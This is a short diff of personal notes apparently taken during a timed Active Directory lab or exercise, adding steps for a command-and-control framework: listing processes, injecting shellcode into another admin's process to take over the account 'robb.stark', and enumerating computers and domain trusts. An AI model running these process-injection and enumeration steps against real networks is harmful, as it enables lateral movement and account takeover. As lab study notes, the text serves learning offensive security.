@@ -19,4 +19,17 @@ tool: bloodhound
     after done go to explore
       search (Jeor)
 
-36:37, 39min left
+ps // see the processes
+if I am admin // I can inject shellcode for processes of other admins
+  usemodule csharp_management_processinjection // just wrote injection and used autocomplete
+  set listener http
+  set pid 4776 // id for process for robb.stark
+  execute
+  now I get access to robb.stark
+
+  -usemodule powerview..._get_computer
+  execute
+  - hostname should also work
+
+usemodule get_domain_trusts
+execute
